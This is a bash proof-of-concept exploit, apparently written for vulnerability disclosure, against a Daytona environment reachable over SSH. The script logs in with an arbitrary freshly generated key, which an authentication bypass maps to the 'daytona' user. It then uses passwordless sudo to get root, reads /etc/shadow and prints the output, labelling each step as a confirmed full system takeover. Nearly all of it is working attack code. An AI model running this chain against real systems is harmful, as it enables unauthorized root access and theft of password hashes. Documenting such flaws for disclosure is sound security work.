#!/bin/bash
# POC: Passwordless Sudo Root Privilege Escalation
# This script demonstrates that the daytona user has unrestricted passwordless sudo access
# allowing immediate privilege escalation to root

set -e

# Configuration
TARGET_HOST="${TARGET_HOST:-localhost}"
TARGET_PORT="${TARGET_PORT:-22220}"
KEY_FILE="/tmp/test_privesc_key"
PUBKEY_FILE="${KEY_FILE}.pub"

echo "[*] Passwordless Sudo Privilege Escalation POC"
echo "[*] Target: $TARGET_HOST:$TARGET_PORT"
echo ""

# Step 1: Generate ED25519 key pair for SSH connection
echo "[+] Step 1: Generating ED25519 key pair..."
if [ ! -f "$KEY_FILE" ]; then
    ssh-keygen -t ed25519 -N "" -f "$KEY_FILE" -q 2>/dev/null || true
fi
chmod 600 "$KEY_FILE"
echo "[+] Key generated at $KEY_FILE"
echo ""

# Step 2: Test SSH connection with the generated key
echo "[+] Step 2: Authenticating via SSH with generated ED25519 key..."
SSH_CMD="ssh -i $KEY_FILE -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -p $TARGET_PORT"

# Connect as root user (will resolve to daytona due to SSH bypass)
echo "[+] Executing: $SSH_CMD root@$TARGET_HOST 'id'"
SSH_OUTPUT=$($SSH_CMD root@$TARGET_HOST 'id' 2>&1 || echo "SSH_FAILED")

if echo "$SSH_OUTPUT" | grep -q "uid="; then
    echo "[+] SSH connection successful"
    echo "[*] Output: $SSH_OUTPUT"
else
    echo "[-] SSH connection failed. Output: $SSH_OUTPUT"
    exit 1
fi
echo ""

# Step 3: Test passwordless sudo - execute 'id' as root
echo "[+] Step 3: Testing passwordless sudo access..."
echo "[+] Executing: $SSH_CMD root@$TARGET_HOST 'sudo id'"
SUDO_OUTPUT=$($SSH_CMD root@$TARGET_HOST 'sudo id' 2>&1)

if echo "$SUDO_OUTPUT" | grep -q "uid=0(root)"; then
    echo "[+] VULNERABLE: Passwordless sudo access confirmed!"
    echo "[*] Output: $SUDO_OUTPUT"
else
    echo "[-] sudo access failed or password required"
    exit 1
fi
echo ""

# Step 4: Test reading privileged file
echo "[+] Step 4: Testing root-level file access via sudo..."
echo "[+] Executing: $SSH_CMD root@$TARGET_HOST 'sudo cat /etc/shadow | head -1'"
SHADOW_OUTPUT=$($SSH_CMD root@$TARGET_HOST 'sudo cat /etc/shadow | head -1' 2>&1)

if echo "$SHADOW_OUTPUT" | grep -q ":"; then
    echo "[+] VULNERABLE: Successfully read /etc/shadow (root-only file)"
    echo "[*] Output (truncated): $(echo "$SHADOW_OUTPUT" | head -1 | cut -c1-80)..."
else
    echo "[-] Could not read /etc/shadow"
    exit 1
fi
echo ""

# Step 5: Test whoami to confirm root context
echo "[+] Step 5: Confirming root context via whoami..."
echo "[+] Executing: $SSH_CMD root@$TARGET_HOST 'sudo whoami'"
WHOAMI_OUTPUT=$($SSH_CMD root@$TARGET_HOST 'sudo whoami' 2>&1 | tr -d '\r\n')

if echo "$WHOAMI_OUTPUT" | grep -qw "root"; then
    echo "[+] VULNERABLE: Confirmed root access via whoami"
    echo "[*] Output: $WHOAMI_OUTPUT"
else
    echo "[-] whoami returned unexpected result: $WHOAMI_OUTPUT"
    exit 1
fi
echo ""

# Summary
echo "================================================================"
echo "[+] VULNERABILITY CONFIRMED:"
echo "    - SSH authentication successful with arbitrary ED25519 key"
echo "    - Passwordless sudo access confirmed"
echo "    - Root privilege escalation successful"
echo "    - CRITICAL: Full system compromise possible"
echo "================================================================"
echo ""
echo "[*] Attack chain:"
echo "    1. Generate random ED25519 key"
echo "    2. SSH authenticate as any user → resolves to daytona (uid=1001)"
echo "    3. Execute sudo without password → escalate to root (uid=0)"
echo "    4. Execute arbitrary root commands"
echo ""
echo "[!] This is a CRITICAL vulnerability enabling full system takeover"
exit 0